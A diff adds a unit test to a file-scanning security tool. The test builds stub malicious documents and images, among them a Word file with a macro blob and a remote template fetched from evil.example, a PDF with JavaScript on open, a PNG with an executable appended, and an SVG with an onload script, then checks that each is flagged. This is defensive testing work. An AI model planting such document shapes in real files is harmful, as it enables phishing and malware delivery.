@@ -258,6 +258,36 @@ class Contract(unittest.TestCase):
         found = sorted((f["vuln_id"], f["status"]) for f in json.loads(out)["findings"] if f["kind"] == "suspect-code")
         self.assertEqual(found, [("SUSPECT-BINARY-BLOB", "warn"), ("SUSPECT-TYPOSQUAT", "warn")], found)
 
+    def test_documents_and_images_are_read_for_malware_shapes(self):
+        import io
+        import zipfile
+        repo = git_repo(self.home / "inbox")
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:  # deflated: read by our own inflater
+            z.writestr("[Content_Types].xml", "<Types/>")
+            z.writestr("word/document.xml", "<w:document>" + "lorem ipsum " * 600 + "</w:document>")
+            z.writestr("word/vbaProject.bin", b"\x01vba")
+            z.writestr("word/_rels/settings.xml.rels",
+                       '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
+                       'Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>')
+        (repo / "invoice.docx").write_bytes(buf.getvalue())
+        (repo / "form.pdf").write_bytes(b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n%%EOF")
+        (repo / "logo.png").write_bytes(bytes([0x89, 0x50, 0x4E, 0x47, 0, 0, 0, 0]) + b"IEND\xaeB`\x82" + b"MZ\x90\x00 a program rides along")
+        (repo / "icon.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect/></svg>')
+        (repo / "photo.jpg").write_bytes(b"\xff\xd8\xff\xe0\x00\x10JFIF fine \xff\xd9")
+        (repo / "notes.docx").write_bytes(b"just text, not a zip")
+        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        self.assertEqual(code, 1, err)
+        findings = json.loads(out)["findings"]
+        docs = sorted((f["vuln_id"], f["status"], f["component"].rsplit("/", 1)[1]) for f in findings if f["kind"] == "document")
+        self.assertEqual(docs, [("DOC-JS-ON-OPEN", "fail", "form.pdf"), ("DOC-MACRO", "fail", "invoice.docx"),
+                                ("DOC-REMOTE-TEMPLATE", "fail", "invoice.docx"), ("DOC-UNREADABLE", "warn", "notes.docx"),
+                                ("IMG-PAYLOAD", "fail", "logo.png"), ("IMG-SVG-SCRIPT", "fail", "icon.svg")], docs)
+        template = next(f for f in findings if f["vuln_id"] == "DOC-REMOTE-TEMPLATE")
+        self.assertIn("evil.example", template["note"])
+        self.assertTrue(all(not f["fix_auto"] for f in findings if f["kind"] == "document"))
+        self.assertTrue(all(f["fix_cmd"] for f in findings if f["kind"] == "document"))
+
     def test_hidden_text_fails_on_bidi_and_warns_on_bait(self):
         repo = git_repo(self.home / "hidden")
         (repo / "auth.rs").write_text("fn main() {\n    let ok = false; /*\u202e } \u2066if (ok)\u2069 \u2066*/ {\n}\n", encoding="utf-8")
